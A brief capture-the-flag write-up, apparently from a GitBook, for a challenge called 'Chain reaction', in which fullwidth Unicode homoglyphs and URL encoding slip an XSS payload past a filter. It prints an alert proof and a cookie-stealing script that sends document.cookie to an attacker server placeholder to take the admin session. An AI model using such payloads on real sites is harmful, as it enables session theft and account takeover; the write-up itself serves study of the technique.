# Chain reaction

First, register  and login 

![](../.gitbook/assets/image%20%2847%29.png)

![](../.gitbook/assets/image%20%2843%29.png)

Go to devchat and we will see john talking about bug

Unicode characters

Take a look our profile

![](../.gitbook/assets/image%20%2848%29.png)

![](../.gitbook/assets/image%20%2845%29.png)

using this to encode [unicode ](https://www.irongeek.com/homoglyph-attack-generator.php)

and use url encode to encode the command

```text
payload = "＞＜Ｓcript＞alert(1)＜/Ｓcript＞
```

![](../.gitbook/assets/image%20%2844%29.png)

![](../.gitbook/assets/image%20%2846%29.png)

=&gt; This chall is xss 

Taking cookie admin

```text
payload = "＞＜Ｓcript＞var i = new Image;i.src="https://[my-server-url]?"+document.cookie＜/Ｓcript＞
```

=&gt; flag

